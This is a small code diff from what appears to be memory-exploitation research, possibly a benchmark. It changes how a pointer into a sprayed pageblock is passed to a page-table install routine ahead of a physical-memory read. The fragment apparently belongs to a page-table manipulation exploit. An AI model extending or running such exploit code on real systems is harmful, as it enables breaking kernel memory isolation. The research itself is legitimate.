@@ -37,7 +37,8 @@ int main() {
         mlock(fd_ptr, PAGE_SIZE);
 
         auto addr    = (void*)(SPRAY_START + PAGEBLOCK_SIZE);
-        pt_install(pageblock, target, addr, fd);
+        void* bait_ptr  = (void*)((unsigned long)pageblock + PAGEBLOCK_SIZE / 2);
+        pt_install(bait_ptr, target, addr, fd);
 
         unsigned long value = rubench_read_phys(target_phys);
         auto file_phys      = rubench_va_to_pa(fd_ptr);
